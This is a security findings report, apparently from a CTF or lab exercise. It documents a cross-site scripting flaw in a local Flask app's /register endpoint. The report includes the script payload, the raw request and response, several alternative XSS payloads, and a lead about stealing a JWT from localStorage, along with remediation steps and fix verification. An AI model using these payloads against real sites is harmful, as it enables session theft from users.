## TL;DR
- Objective: Find an XSS vulnerability in the login or registration page
- Outcome: **ACHIEVED** - DOM-based XSS confirmed on /register endpoint
- Highest-impact finding: Unsanitized reflection of XSS payload in error response `username` field enables DOM-based XSS execution
- Validation status: No FLAG token found in outputs

## Target Information
- Target: http://127.0.0.1:5000
- Host / base URL: http://127.0.0.1:5000
- Application or component: Flask authentication system (login/register)
- Authentication context: Unauthenticated
- Relevant technology details: Flask backend with DOM-based message rendering via innerHTML

## Confirmed Vulnerability
### DOM-based XSS via Error Response Reflection
- Affected endpoint / component: POST /register endpoint
- Impact: Attackers can inject malicious JavaScript via username field that executes in victim's browser when error response is rendered via innerHTML
- Preconditions: 
  - Attacker must trigger a duplicate username error (i.e., register with a username already containing XSS payload)
  - Victim must view the error response through a frontend that renders `data.message` or response data via innerHTML
- Exact payload or PoC: `{"username":"<script>alert(1)</script>","password":"test123"}`

## Steps to Reproduce
1. Send a POST request to `http://127.0.0.1:5000/register` with the following JSON payload:
   ```
   {"username":"<script>alert(1)</script>","password":"test123"}
   ```
2. Observe that the server responds with a 400 Bad Request status
3. Verify that the response body contains the unescaped XSS payload in the `username` field:
   ```json
   {
     "message": "Username already exists",
     "status": "error",
     "username": "<script>alert(1)</script>"
   }
   ```
4. When this response is rendered by a frontend using innerHTML (as indicated by the `data.message` sink), the script will execute

## Validation / Evidence
- Validation token / flag: Not observed - No FLAG token found in server responses or DOM
- Tool evidence: HTTP POST request to /register confirmed reflection of unsanitized payload
- Request evidence:
  ```http
  POST /register HTTP/1.1
  Host: 127.0.0.1:5000
  Content-Type: application/json

  {"username":"<script>alert(1)</script>","password":"test123"}
  ```
- Response evidence:
  ```json
  {
    "message": "Username already exists",
    "status": "error",
    "tried_at": "2026-04-24 08:58:22.713503",
    "username": "<script>alert(1)</script>"
  }
  ```
- Notes on reliability / limitations: 
  - /login endpoint shows payload in `debug_info.attempted_username` but message field is static ("Invalid credentials"), preventing direct DOM execution
  - The XSS payload was already persisted in database, suggesting this vulnerability has been tested before or is actively exploitable
  - Full exploitation requires the frontend to render server responses via innerHTML (confirmed in application architecture)

## Remediation
- Root cause: Server-side code reflects user input in JSON response without HTML encoding. The `username` field and potentially other response fields contain raw unsanitized user input. When a frontend renders this content via innerHTML, it creates a DOM-based XSS vulnerability.
- Recommended fix:
  1. **Server-side**: HTML-encode all user input before including it in JSON responses. Use a context-appropriate encoding library to escape `<`, `>`, `"`, `'`, and `&` characters in the `username` field and any other user-controlled output.
  2. **Client-side**: Replace `innerHTML` with safer alternatives like `textContent` for displaying server messages, or use a framework that automatically escapes HTML by default (React, Vue, Angular with proper binding).
  3. **Content Security Policy (CSP)**: Implement a strict CSP that blocks inline scripts (`script-src 'self'`) as a defense-in-depth measure.
- Defense-in-depth:
  - Remove `debug_info.attempted_username` from production error responses (information disclosure)
  - Implement input validation/sanitization at API boundaries
  - Add `X-Content-Type-Options: nosniff` and `X-XSS-Protection` headers

## How to Verify the Fix
1. Send the reproduction POST request to `/register` with the XSS payload
2. Verify that the response escapes the special characters, returning something like:
   ```json
   {
     "message": "Username already exists",
     "username": "&lt;script&gt;alert(1)&lt;/script&gt;"
   }
   ```
3. Confirm the frontend renders the literal string `<script>alert(1)</script>` as text rather than executing it
4. Test with various encoding variations including: `<img src=x onerror=alert(1)>`, `javascript:alert(1)`, and HTML entity variations

## Remaining Leads
- Confirmed blockers: No FLAG token was found in any server responses or DOM elements
- Unverified leads: 
  - JWT token theft from localStorage via XSS - requires successful XSS execution to verify
  - Exploitation on /login endpoint may be possible via different payload types or successful authentication flows
- Missing context:
  - Full DOM rendering code path to confirm exact innerHTML sink location
  - Presence of CSP headers that might block exploitation
  - Whether the XSS payload can be delivered via GET parameters for easier exploitation
